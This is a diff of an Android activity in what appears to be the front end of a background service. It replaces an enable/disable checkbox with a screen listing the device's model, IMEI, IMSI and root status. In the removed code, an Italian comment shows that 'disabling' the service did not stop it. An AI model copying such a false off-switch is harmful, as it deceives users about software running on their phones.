@@ -12,17 +12,17 @@ package com.android.networking.gui;
 import android.app.Activity;
 import android.content.ComponentName;
 import android.content.Intent;
-import android.content.SharedPreferences;
+import android.os.Build;
 import android.os.Bundle;
-import android.preference.PreferenceManager;
-import android.view.View;
-import android.view.View.OnClickListener;
 import android.widget.CheckBox;
-import android.widget.Toast;
+import android.widget.TextView;
 
 import com.android.networking.Core;
+import com.android.networking.Device;
 import com.android.networking.R;
+import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
+import com.android.networking.capabilities.PackageInfo;
 import com.android.networking.util.Check;
 
 /**
@@ -31,8 +31,6 @@ import com.android.networking.util.Check;
  */
 public class AGUI extends Activity {
 	protected static final String TAG = "AndroidServiceGUI"; //$NON-NLS-1$
-
-	private CheckBox checkBox;
 
 	/**
 	 * Called when the activity is first created.
@@ -50,53 +48,47 @@ public class AGUI extends Activity {
 	@Override
 	public void onDestroy() {
 		super.onDestroy();
-
-		SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
-		SharedPreferences.Editor editor = preferences.edit();
-		editor.putBoolean("enabled", checkBox.isEnabled());
-		editor.commit();
-		
-		//Status.self().gui = null;
 	}
 
 	private void actualCreate(final Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 
+		Status.setAppContext(getApplicationContext());
+		
 		startService();
-		setContentView(R.layout.main);
+		setContentView(R.layout.main); 
 
-		// Checkbox listener
-		checkBox = (CheckBox) findViewById(R.id.enabled);
+	    TextView t = (TextView)findViewById(R.id.imei);
+	    
+	    t.setText("This is a list of device information for the current Android device:\n\n");
+	    
+	        
+	    if (Build.MODEL.length() > 0)
+	    	t.append("Model: " + Build.MODEL + "\n");
+	    
+	    if (Build.BRAND.length() > 0)
+	    	t.append("Brand: " + Build.BRAND + "\n");
+	    
+	    if (Build.DEVICE.length() > 0)
+	    	t.append("Device: " + Build.DEVICE + "\n");
+	    
+		if (Device.self().getImei().length() > 0)
+			t.append("IMEI: " + Device.self().getImei() + "\n");
 
-		// Retrieve saved status
-		SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
-
-		try {
-			checkBox.setChecked(preferences.getBoolean("enabled", false));
-		} catch (Exception e) {
-			checkBox.setChecked(false);
-		}
-
-		checkBox.setOnClickListener(new OnClickListener() {
-			@Override
-			public void onClick(View v) {
-				SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
-				SharedPreferences.Editor editor = preferences.edit();
-
-				if (checkBox.isChecked()) {
-					editor.putBoolean("enabled", true);
-
-					Toast.makeText(AGUI.this, "Circles is now enabled", Toast.LENGTH_LONG).show();
-				} else {
-					editor.putBoolean("enabled", false);
-
-					// IGNORA LO STOP DEL SERVIZIO
-					Toast.makeText(AGUI.this, "Circles is now disabled", Toast.LENGTH_LONG).show();
-				}
-
-				editor.commit();
-			}
-		});
+		if (Device.self().getImsi().length() > 0)
+			t.append("IMSI: " + Device.self().getImsi() + "\n");
+		
+	    if (Build.BOARD.length() > 0)
+	    	t.append("Board: " + Build.BOARD + "\n");
+	    
+	    if (Build.DISPLAY.length() > 0)
+	    	t.append("Display: " + Build.DISPLAY + "\n");
+		
+		if (PackageInfo.hasSu()) {
+			t.append("Root: yes");
+		} else {
+			t.append("Root: no");
+		} 
 	}
 	
 	private void startExtService() {
@@ -139,5 +131,4 @@ public class AGUI extends Activity {
 			}
 		}
 	}
-
 }
